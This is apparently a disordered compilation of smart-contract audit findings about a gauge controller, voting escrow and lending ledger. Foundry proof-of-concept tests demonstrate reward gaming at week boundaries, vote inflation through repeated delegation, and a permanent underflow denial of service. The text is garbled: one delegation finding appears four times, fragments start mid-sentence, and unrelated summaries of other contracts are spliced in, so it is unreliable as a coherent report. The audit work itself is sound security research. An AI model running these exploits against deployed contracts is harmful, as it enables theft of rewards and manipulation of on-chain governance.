Rewards are distributed for each week during which the deposit was inside the market. However, the user can cheat this condition because we are rounding down to the start of the week, so the user can deposit at 23:59 at the end of the week and withdraw at 00:00 and still get rewarded as if he had his deposit for the whole week.\n\n## Proof of Concept\nTest case for the `LendingLedger.t.sol`\n```\n    function setupStateBeforeClaim() internal {\n        whiteListMarket();\n\n        vm.prank(goverance);\n        ledger.setRewards(0, WEEK*10, amountPerEpoch);\n\n        // deposit into market at 23:59 (week 4)\n        vm.warp((WEEK * 5) - 1);\n\n        int256 delta = 1.1 ether;\n        vm.prank(lendingMarket);\n        ledger.sync_ledger(lender, delta);\n\n        // airdrop ledger enough token balance for user to claim\n        payable(ledger).transfer(1000 ether);\n        // withdraw at 00:00 (week 5)\n        vm.warp(block.timestamp + 1);\n        vm.prank(lendingMarket);\n        ledger.sync_ledger(lender, delta * (-1));\n    }\n\n    function testClaimValidLenderOneEpoch() public {\n        setupStateBeforeClaim();\n\n        uint256 balanceBefore = address(lender).balance;\n        vm.prank(lender);\n        ledger.claim(lendingMarket, 0, type(uint256).max);\n        uint256 balanceAfter = address(lender).balance;\n        assertTrue(balanceAfter - balanceBefore == 1 ether);\n\n        uint256 claimedEpoch = ledger.userClaimedEpoch(lendingMarket, lender);\n        assertTrue(claimedEpoch - WEEK*4 == WEEK);\n    }\n```\n## Tools Used\nFoundry\n## Recommended Mitigation Steps\nIt's difficult to propose a solution for this exploit without major changes in the contract's architecture. Perhaps we can somehow split the amount based on the time the sync was made inside the week, let's say Alice's `last_sync` was in the middle of week0, she deposited 1 ether, thus her amount for the current epoch will be 1/2 ether. However there is a caveat, how do we fill the gaps? We can't fill them with 1/2 ether. We can use this struct though,\n```\nAmount {\n    uint256 actualAmount,\n    uint256 fraction\n}\n```\nso we can use `fraction` for the current epoch and `actualAmount = 1 ether` to fill the gaps. \n\n\n## Assessed type\n\nTiming"

Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.\n\n## Proof of Concept\n`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. \nThe `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.\n\nDue to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.\n\nA POC was built in Foundry, add the following test to `GaugeController.t.sol`:\n```solidity\nfunction testDelegateSystemMultipleVoting() public {\n    vm.deal(user1, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user1);\n    gc.change_gauge_weight(user1, 100);\n    vm.stopPrank();\n\n    vm.deal(user2, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user2);\n    gc.change_gauge_weight(user2, 100);\n    vm.stopPrank();\n\n    uint256 v = 10 ether;\n\n    vm.startPrank(user1);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user1, 10_000);\n    vm.stopPrank();\n\n    vm.startPrank(user2);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user2, 10_000);\n    vm.stopPrank();\n\n    uint256 expectedWeight_ = gc.get_gauge_weight(user1);\n\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);\n\n    uint256 numDelegatedTimes_ = 20;\n\n    for (uint i_; i_ < numDelegatedTimes_; i_++) {\n        address fakeUserI_ = vm.addr(i_ + 27); // random num\n        vm.deal(fakeUserI_, 1);\n\n        vm.prank(fakeUserI_);\n        ve.createLock{value: 1}(1);\n\n        vm.prank(user1);\n        ve.delegate(fakeUserI_);\n\n        vm.prank(fakeUserI_);\n        gc.vote_for_gauge_weights(user1, 10_000);\n    }\n\n    // assert that the weight is approx numDelegatedTimes_ more than expected\n    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);\n\n    // relative weight has been increase by a lot, can be increased even more if wished\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);\n}\n```\n\n## Tools Used\nVscode, Foundry\n\n## Recommended Mitigation Steps\nThe vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther"

            "detail": "\n# Vulnerability details\n\n## Impact\nDelegate mechanism in `VotingEscrow` allows infinite votes in `vote_for_gauge_weights()` in the `GaugeController`. Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.\n\n## Proof of Concept\n`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. \nThe `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.\n\nDue to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.\n\nA POC was built in Foundry, add the following test to `GaugeController.t.sol`:\n```solidity\nfunction testDelegateSystemMultipleVoting() public {\n    vm.deal(user1, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user1);\n    gc.change_gauge_weight(user1, 100);\n    vm.stopPrank();\n\n    vm.deal(user2, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user2);\n    gc.change_gauge_weight(user2, 100);\n    vm.stopPrank();\n\n    uint256 v = 10 ether;\n\n    vm.startPrank(user1);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user1, 10_000);\n    vm.stopPrank();\n\n    vm.startPrank(user2);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user2, 10_000);\n    vm.stopPrank();\n\n    uint256 expectedWeight_ = gc.get_gauge_weight(user1);\n\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);\n\n    uint256 numDelegatedTimes_ = 20;\n\n    for (uint i_; i_ < numDelegatedTimes_; i_++) {\n        address fakeUserI_ = vm.addr(i_ + 27); // random num\n        vm.deal(fakeUserI_, 1);\n\n        vm.prank(fakeUserI_);\n        ve.createLock{value: 1}(1);\n\n        vm.prank(user1);\n        ve.delegate(fakeUserI_);\n\n        vm.prank(fakeUserI_);\n        gc.vote_for_gauge_weights(user1, 10_000);\n    }\n\n    // assert that the weight is approx numDelegatedTimes_ more than expected\n    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);\n\n    // relative weight has been increase by a lot, can be increased even more if wished\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);\n}\n```\n\n## Tools Used\nVscode, Foundry\n\n## Recommended Mitigation Steps\nThe vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther"

Consequently, the delegates method may return the delegator's own address instead of address(0) when queried with a delegator who has incorrectly delegated to the zero address, due to the condition (return current == address(0) ? delegator : current). This flaw becomes critical in the _moveDelegates function, which operates based on the output of delegates. If delegates returns an improper delegatee, it can lead to an underflow during the subtraction of vote amounts. This miscalculation results in a revert of the token transfer action, potentially locking the NFT and making it untransferable, unburnable, and preventing the affected user from properly re-delegating their voting power.

            "detail": "\n# Vulnerability details\n\n## Impact\nVoting power towards gauges will be lost and project will not work properly \n\n## Proof of Concept\nThe mapping `time_weight` takes a gauge as a param and returns the most recent timestamp a gauge has had its weight recorded/ updated. There are 2 ways to set this value: through `_get_weight` and `_change_gauge_weight`. \n```solidity\nfunction _get_weight(address _gauge_addr) private returns (uint256) {\n        uint256 t = time_weight[_gauge_addr];\n        if (t > 0) {\n            Point memory pt = points_weight[_gauge_addr][t];\n            for (uint256 i; i < 500; ++i) {\n                if (t > block.timestamp) break;\n                t += WEEK;\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n                    pt.bias = 0;\n                    pt.slope = 0;\n                }\n                points_weight[_gauge_addr][t] = pt;\n                if (t > block.timestamp) time_weight[_gauge_addr] = t;\n            }\n            return pt.bias;\n        } else {\n            return 0;\n        }\n    }\n``` \nThe problem in `_get_weight` is that the initial value of any `time_weight[_gauge_addr]` will be 0. It will go through the entirety of the loop and `t` will increase +1 week for every iteration. The problem is that even after 500 iterations `t` will be `< block.timestamp` so the value of `time_weight[_gauge_addr]` will remain 0. Unless admins call manually `_change_gauge_weight` to set an initial value, `time_weight[_gauge_addr]` will remain 0. Any  time a user will use `_get_weight` to fill with recent data, the function will iterate over old values and will do nothing. Recent values won't be set and anything depending on it will receive 0 as a recent value.\n```solidity\n    function _change_gauge_weight(address _gauge, uint256 _weight) internal {\n        uint256 old_gauge_weight = _get_weight(_gauge);\n        uint256 old_sum = _get_sum();\n        uint256 next_time = ((block.timestamp + WEEK) / WEEK) * WEEK;\n\n        points_weight[_gauge][next_time].bias = _weight;\n        time_weight[_gauge] = next_time;\n\n        uint256 new_sum = old_sum + _weight - old_gauge_weight;\n        points_sum[next_time].bias = new_sum;\n        time_sum = next_time;\n    }\n```\nSince `_change_gauge_weight` is not called within `add_gauge`, even if we expect the owners to call it, any votes happening in the time between the adding of the gauge and the admin set function will be lost. The user will only be able to retrieve them by later removing their vote and voting again.\nHere are 3 written test-cases which prove the statements above: \n```solidity\n   function testWithoutManualSet() public {\n        vm.startPrank(gov);\n        gc.add_gauge(gauge1);\n        vm.stopPrank();\n\n        vm.startPrank(user1);\n        ve.createLock{value: 1 ether}(1 ether);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        uint weight = gc.get_gauge_weight(gauge1);\n        console.log(\"gauge's weight after voting: \", weight);\n        vm.stopPrank();\n    }\n\n    function testWithManualSet() public { \n        vm.startPrank(gov);\n        gc.add_gauge(gauge1);\n        gc.change_gauge_weight(gauge1, 0);\n        vm.stopPrank();\n\n        vm.startPrank(user1);\n        ve.createLock{value: 1 ether}(1 ether);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        uint weight = gc.get_gauge_weight(gauge1);\n        console.log(\"gauge's weight after voting: \", weight);\n        vm.stopPrank();\n    }\n\n    function testWithChangeMidway() public {\n        vm.startPrank(gov);\n        gc.add_gauge(gauge1);\n        vm.stopPrank();\n\n        vm.startPrank(user1);\n        ve.createLock{value: 1 ether}(1 ether);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        uint weight = gc.get_gauge_weight(gauge1);\n        console.log(\"gauge's weight after voting: \", weight);\n        vm.stopPrank();\n\n        vm.prank(gov);\n        gc.change_gauge_weight(gauge1, 0);\n\n        vm.startPrank(user1);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        weight = gc.get_gauge_weight(gauge1);\n        console.log(\"gauge's weight after voting after admin set\", weight);\n\n        gc.vote_for_gauge_weights(gauge1, 0);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        weight = gc.get_gauge_weight(gauge1);\n        console.log(\"gauge's weight after voting after admin set after vote reset\", weight);\n        \n    }\n```\nand the respective results:\n```\n[PASS] testWithoutManualSet() (gas: 645984)\nLogs:\n  gauge's weight after voting:  0\n```\n```\n[PASS] testWithManualSet() (gas: 667994)\nLogs:\n  gauge's weight after voting:  993424657416307200\n```\n```\n[PASS] testWithChangeMidway() (gas: 744022)\nLogs:\n  gauge's weight after voting:  0\n  gauge's weight after voting after admin set 0\n  gauge's weight after voting after admin set after vote reset 993424657416307200\n```\n\n## Tools Used\nManual Review, Foundry\n\n## Recommended Mitigation Steps\nUpon adding a gauge, make a call to `change_gauge_weight` and set its initial weight to 0. \n\n\n\n\n\n## Assessed type\n\nError"

It does this by simply returning early from the function if the condition is met. However, the function also inadvertently stops updating the accounting for accrued trading fees (i.e., `feesTrader`, `feesExchange`, and `epochTotalFee`). Therefore, any fees collected after the total supply reaches 1 billion will not be tracked, leading to a situation where stakers will not receive the trading fee rewards they are entitled to, and those fees cannot be distributed or reclaimed.\n\nThis is problematic not only from a functional perspective, where stakers being unable to receive their deserved rewards is a direct financial impact, but also from a contract integrity perspective, as it may diminish trust in the smart contract system or the platform operating it.\n\nThe proposed mitigation steps involve restructuring the `addFee` function. Rather than returning early, it ensures that the accounting for fees continues irrespective of the total supply of `rewardToken`. The minting of new tokens is the only part stopped, while the recording of the fees remains unaffected. This ensures that rewards based on trading fees can continue to be calculated and distributed correctly up to and after the cap on `rewardToken` supply is reached.\n\nThis restructuring does not change the functionality of the `add_gauge` function provided at the end of the question, which appears to be unrelated to the `addFee` method and the vulnerability discussed. The `add_gauge` function is a separate method for adding new gauges and includes an already existing safeguard against adding duplicates, as indicated by the `require` statement. Since there were no specific details provided about vulnerabilities within the `add_gauge` function, it's assumed to operate as expected based on the given code snippet.\n\nThe patch included in the vulnerability report can therefore be used to fix the vulnerability found in the `RewardDistributor`'s `addFee` function. But the `add_gauge` function should be analyzed separately, as it doesn't seem to be directly linked to the fee distribution mechanism and its potential issue would require a different context to evaluate.",

            "detail": "\n# Vulnerability details\n\n## Impact\nDelegate mechanism in `VotingEscrow` allows infinite votes in `vote_for_gauge_weights()` in the `GaugeController`. Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.\n\n## Proof of Concept\n`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. \nThe `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.\n\nDue to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.\n\nA POC was built in Foundry, add the following test to `GaugeController.t.sol`:\n```solidity\nfunction testDelegateSystemMultipleVoting() public {\n    vm.deal(user1, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user1);\n    gc.change_gauge_weight(user1, 100);\n    vm.stopPrank();\n\n    vm.deal(user2, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user2);\n    gc.change_gauge_weight(user2, 100);\n    vm.stopPrank();\n\n    uint256 v = 10 ether;\n\n    vm.startPrank(user1);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user1, 10_000);\n    vm.stopPrank();\n\n    vm.startPrank(user2);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user2, 10_000);\n    vm.stopPrank();\n\n    uint256 expectedWeight_ = gc.get_gauge_weight(user1);\n\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);\n\n    uint256 numDelegatedTimes_ = 20;\n\n    for (uint i_; i_ < numDelegatedTimes_; i_++) {\n        address fakeUserI_ = vm.addr(i_ + 27); // random num\n        vm.deal(fakeUserI_, 1);\n\n        vm.prank(fakeUserI_);\n        ve.createLock{value: 1}(1);\n\n        vm.prank(user1);\n        ve.delegate(fakeUserI_);\n\n        vm.prank(fakeUserI_);\n        gc.vote_for_gauge_weights(user1, 10_000);\n    }\n\n    // assert that the weight is approx numDelegatedTimes_ more than expected\n    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);\n\n    // relative weight has been increase by a lot, can be increased even more if wished\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);\n}\n```\n\n## Tools Used\nVscode, Foundry\n\n## Recommended Mitigation Steps\nThe vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther"

            "detail": "\n# Vulnerability details\n\n## Impact\nIn `delegate()` of VoteEscrow.sol, a user is able to delegate their locked votes to someone else, and undelegate (i.e. delegate back to themselves). When the user tries to re-delegate, either to someone else or themselves, the lock must not be expired. This is problematic because if a user forgets and lets their lock become expired, they cannot undelegate. This blocks withdrawal, which means their tokens are essentially locked forever.\n\n## Proof of Concept\nTo exit the system, Alice must call `withdraw()`. However, since they've delegated, they will not be able to.\n```solidity\nfunction withdraw() external nonReentrant {\n\t...\n\trequire(locked_.delegatee == msg.sender, \"Lock delegated\");\n\t...\n}\n```\nTo re-delegate to themselves (undelegate), they call `delegate(alice.address)`. However, there is a check to see if `toLocked.end` has expired, which would be true since it would point to Alice's lock.\n```\nfunction delegate(address _addr) external nonReentrant {\n\tLockedBalance memory locked_ = locked[msg.sender];\n\t...\n\tLockedBalance memory fromLocked;\n\tLockedBalance memory toLocked;\n\tlocked_.delegatee = _addr;\n\tif (delegatee == msg.sender) {\n\t\t...\n\t// @audit this else if will execute\n\t} else if (_addr == msg.sender) {\n\t\t// Undelegate\n\t\tfromLocked = locked[delegatee]; // @audit Delegatee\n\t\ttoLocked = locked_; // @audit Alice's lock\n\t}\n\t...\n\trequire(toLocked.end > block.timestamp, \"Delegatee lock expired\");\n```\n\nThis is a test to be added into VoteEscrow.t.sol. It can be manually run by executing `forge test --match-test testUnSuccessUnDelegate`. \n```solidity\nfunction testUnSuccessUnDelegate() public {\n\ttestSuccessDelegate();\n\tvm.warp(ve.LOCKTIME() + 1 days);\n\n\t// Try to undelegate\n\tvm.startPrank(user1);\n\tvm.expectRevert(\"Delegatee lock expired\");\n\tve.delegate(user1);\n\n\t// Still user2\n\t(, , , address delegatee) = ve.locked(user1);\n\tassertEq(delegatee, user2);\n}\n```\n## Tools Used\nManual\n\n## Recommended Mitigation Steps\nConsider refactoring the code to skip `toLocked.end > block.timestamp` if undelegating. For example, adding a small delay (e.g., 1 second) to the lock end time when a user undelegates.\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nTiming"

The issue occurs in the `_withdraw` function of the ReaperVaultV2 where it fails to properly account for losses when setting the withdrawal value to the vault balance if it is less than the requested amount, and proceeds to burn all the user's shares without considering the actual loss. This might lead to losses exceeding the allowed `withdrawMaxLoss` limit. Suggested mitigation includes rewriting the withdrawal logic to enforce the `withdrawMaxLoss` parameter effectively.",

Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.\n\n## Proof of Concept\n`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. \nThe `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.\n\nDue to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.\n\nA POC was built in Foundry, add the following test to `GaugeController.t.sol`:\n```solidity\nfunction testDelegateSystemMultipleVoting() public {\n    vm.deal(user1, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user1);\n    gc.change_gauge_weight(user1, 100);\n    vm.stopPrank();\n\n    vm.deal(user2, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user2);\n    gc.change_gauge_weight(user2, 100);\n    vm.stopPrank();\n\n    uint256 v = 10 ether;\n\n    vm.startPrank(user1);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user1, 10_000);\n    vm.stopPrank();\n\n    vm.startPrank(user2);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user2, 10_000);\n    vm.stopPrank();\n\n    uint256 expectedWeight_ = gc.get_gauge_weight(user1);\n\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);\n\n    uint256 numDelegatedTimes_ = 20;\n\n    for (uint i_; i_ < numDelegatedTimes_; i_++) {\n        address fakeUserI_ = vm.addr(i_ + 27); // random num\n        vm.deal(fakeUserI_, 1);\n\n        vm.prank(fakeUserI_);\n        ve.createLock{value: 1}(1);\n\n        vm.prank(user1);\n        ve.delegate(fakeUserI_);\n\n        vm.prank(fakeUserI_);\n        gc.vote_for_gauge_weights(user1, 10_000);\n    }\n\n    // assert that the weight is approx numDelegatedTimes_ more than expected\n    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);\n\n    // relative weight has been increase by a lot, can be increased even more if wished\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);\n}\n```\n\n## Tools Used\nVscode, Foundry\n\n## Recommended Mitigation Steps\nThe vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther"

It contains the following loop:\n```solidity\n            for (uint256 i; i < 500; ++i) {\n                if (t > block.timestamp) break;\n                t += WEEK;\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n                    pt.bias = 0;\n                    pt.slope = 0;\n                }\n                points_weight[_gauge_addr][t] = pt;\n                if (t > block.timestamp) time_weight[_gauge_addr] = t;\n            }\n```\n\nThere are two possible scenarios:\n- `pt.bias > d_bias`\n- `pt.bias <= d_bias`\n\nThe first scenario will always happen naturally, since `pt.bias` will be the total voting power allocated for some point and since slope is a sum of all users' slopes and slopes are calculated in such a way that `<SLOPE> * <TIME_TO_END_OF_STAKING_PERIOD> = <INITIAL_BIAS>`.\n\nHowever, it is possible to artificially change `points_weight[_gauge_addr][t].bias` by calling `change_gauge_weight` (which can be only called by the governance). It important to notice here, that `change_gauge_weight` **doesn't modify** `points_weight[_gauge_addr][t].slope`\n\n`change_gauge_weight` does permit to change the weight to a smaller number than its current value, so it's both perfectly legal and possible that governance does this at some point (it could be changing the weight to `0` or any other value smaller than the current one).\n\nThen, at some point when `_get_weight` is called, we will enter the `else` block because `pt.bias` will be less than the sum of all user's biases (since originally these values were equal, but `pt.bias` was lowered by the governance). It will set `pt.bias` and `pt.slope` to `0`.\n\nAfter some time, the governance may realise that the gauge's weight is `0`, but should be bigger and may change it to some bigger value.\n\nWe will have the situation where `points_weight[_gauge_addr][t].slope = 0` and `points_weight[_gauge_addr][t].bias > 0`.\n\nIf this happens and there is any nonzero `changes_weight[_gauge_addr]` not yet taken into account (for instance in the week after the governance update), then all the functions related to the gauge at `_gauge_addr` will not work.\n\nIt's because, the following functions:\n- `checkpoint_gauge`\n- `gauge_relative_weight_write`\n- `gauge_relative_weight`\n- `_change_gauge_weight`\n- `change_gauge_weight`\n- `vote_for_gauge_weights`\n- `remove_gauge`\n\ncall `_get_weight` at some point.\n\nLet's see what will happen in `_get_weight` when it's called:\n```solidity\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n```\n\nWe will enter the `if` statement, because `pt.bias` will be `> 0` and `pt.slope` will be `0` (or some small value, if users give their voting power to gauge in the meantime), since it was previously set to `0` in the `else` statement and wasn't touched when gauge's weight was changed by the governance. We will:\n- subtract `d_bias` from `pt.bias` which will succeed\n- attempt to subtract `changes_weight[_gauge_addr][t]` from `d_slope`\n\nHowever, there could be a user (or users) whose voting power allocation finishes at `t` for some `t` not yet handled. It means that `changes_weight[_gauge_addr][t] > 0` (and if `pt.slope` is not `0`, then `changes_weight[_gauge_addr][t]` still may be greater than it). \n\nIf this happens, then the integer underflow will happen in `pt.slope -= d_slope;`. It will now happen in **every** call to `_get_weight` and it won't be possible to recover, because:\n- `vote_for_gauge_weights` will revert\n- `change_gauge_weight` will revert\n\nas they call `_get_weight` internally. So, it won't be possible to modify `pt.slope` and `pt.bias` for any point in time, so the `revert` will always happen for that gauge. It won't even be possible to remove that gauge.\n\nSo, in short, the scenario is as follows:\n1. Users allocate their voting power to a gauge `X`.\n2. Governance at some point decreases the weight of `X`.\n3. Users withdraw their voting power as the time passes, and finally the weight of `X` drops to `0`.\n4. Governance realises this and increases weight of `X` since it wants to incentivise users to provide liquidity in `X`.\n5. Voting power delegation of some user(s) ends some time after that and `_get_weight` attempts to subtract `changes_weight[_gauge_addr][t]` from the current slope (which is either `0` or some small value) and it results in integer underflow.\n6. `X` is unusable and it's impossible to withdraw voting power from (so users cannot give their voting power somewhere else). The weight of `X` cannot be changed anymore and `X` cannot be even removed.\n\n**Note that it is also possible to frontrun the call to `change_gauge_weight` when the weight is set to a lower value** - user with a lot of capital can watch the mempool and if weight is lowered to some value `x`, he can give a voting power of `x` to that gauge. Then, right after weight is changed by the governance, he can withdraw his voting power, leaving the gauge with weight = `0`. Then, governance will manually increase the weight to recover and DoS will happen as described. **So it is only needed that governance decreases gauge's weight at some point**.\n\n## Impact\nAs stated, above the impact is that the entire gauge is useless, voting powers are permanently locked there and its weight is impossible to change, so the impact is high.\n\nIn order for this situation to succeed, governance has to decrease weight of some gauge, but I think it's very likely, because:\n1. `_get_weight` checks that `if (pt.bias > d_bias)` and it handles the opposite situation, so it is anticipated that it may genuinely happen.\n2. It is definitely possible to decrease gauge's weight and it's even possible to zero it out (as in the `remove_gauge`).\n3. The situation where `old_bias` is greater than `old_sum_bias + new_bias` is handled in `vote_for_gauge_weights`, but it may only happen when gauge's weight was decreased by the governance.\n4. The situation where `old_slope.slope` is greater than `old_sum_slope + new_slope.slope` is also handled there, but it may only happen if we enter the `else` statement in `_get_weight`.\n\nSo, it is predicted that gauge's weight may be lowered and the protocol does its best to handle it properly, but as I showed, it fails to do so. Hence, I believe that this finding is of High severity, because although it requires governance to perform some action (decrease weight of some gauge), I believe that it's likely that governance decides to decrease weight, especially that it is anticipated in the code and edge cases are handled there (and they wouldn't be if we assumed that governance would never allowed them to happen).\n\n## Proof of Concept\nPlease run the test below. The test shows slightly simplified situation where governance just sets weight to `0` for `gauge1`, but as I've described above, it suffices that it's just changed to a smaller value and it may drop to `0` naturally as users withdraw their voting power. The following import will also have to be added: `import {Test, stdError} from \"forge-std/Test.sol\";`.\n\n```solidity\nfunction testPoC1() public\n    {\n        // gauge is being set up\n        vm.startPrank(gov);\n        gc.add_gauge(gauge1);\n        gc.change_gauge_weight(gauge1, 0);\n        vm.stopPrank();\n\n        // `user1` pays some money and adds his power to `gauge1`\n        vm.startPrank(user1);\n        ve.createLock{value: 1 ether}(1 ether);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        vm.warp(block.timestamp + 10 weeks);\n        gc.checkpoint_gauge(gauge1);\n        vm.stopPrank();\n\n        // `user2` does the same\n        vm.startPrank(user2);\n        ve.createLock{value: 1 ether}(1 ether);\n        gc.vote_for_gauge_weights(gauge1, 10000);\n        vm.warp(block.timestamp + 1 weeks);\n        gc.checkpoint_gauge(gauge1);\n        vm.stopPrank();\n\n        vm.warp(block.timestamp + 1825 days - 14 weeks);\n        vm.startPrank(gov);\n        // weight is changed to `0`, just to simplify\n        // normally, weight would just be decreased here and then subsequently decreased by users when their\n        // locking period is over until it finally drops to `0`\n        // alternatively, some whale can frontrun a call to `change_gauge_weight` as described and then\n        // withdraw his voting power leaving the gauge with `0` slope and `0` bias\n        gc.change_gauge_weight(gauge1, 0);\n        vm.warp(block.timestamp + 1 weeks);\n        \n        // now, weight is changed to some bigger value\n        gc.change_gauge_weight(gauge1, 1 ether);\n        vm.stopPrank();\n        // some time passes so that user1's locking period ends\n        vm.warp(block.timestamp + 5 weeks);\n        \n        // `user2` cannot change his weight although his `locked.end` is big enough\n        vm.prank(user2);\n        vm.expectRevert(stdError.arithmeticError);\n        gc.vote_for_gauge_weights(gauge1, 0);\n\n        // governance cannot change weight\n        vm.startPrank(gov);\n        vm.expectRevert(stdError.arithmeticError);\n        gc.change_gauge_weight(gauge1, 2 ether);\n        \n        // governance cannot even remove the gauge\n        // it's now impossible to do anything on gauge1\n        vm.expectRevert(stdError.arithmeticError);\n        gc.remove_gauge(gauge1);\n        vm.stopPrank();\n    }\n```\n\n## Tools Used\nVS Code\n\n## Recommended Mitigation Steps\nPerform `pt.slope -= d_slope` in `_get_weight` only when `pt.slope >= d.slope` and otherwise zero it out.\n\n\n\n\n\n## Assessed type\n\nUnder/Overflow"

